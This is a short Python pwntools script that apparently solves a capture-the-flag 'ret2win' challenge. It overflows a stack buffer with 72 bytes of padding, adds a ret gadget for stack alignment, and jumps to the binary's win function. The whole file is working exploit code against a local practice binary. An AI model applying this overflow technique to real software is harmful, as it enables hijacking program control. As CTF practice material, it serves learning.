from pwn import *

elf = ELF('./challenge')
context.binary = elf

offset = 72
win_address = elf.sym['win']  # 0x401166

# Find ret gadget for 16-byte stack alignment in x64
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]  # 0x401016

payload = b'A' * offset
payload += p64(ret_gadget)   # Fix stack alignment (ret sled)
payload += p64(win_address)  # Jump to win()

p = process('./challenge')

p.sendlineafter(b'input: ', payload)
p.interactive()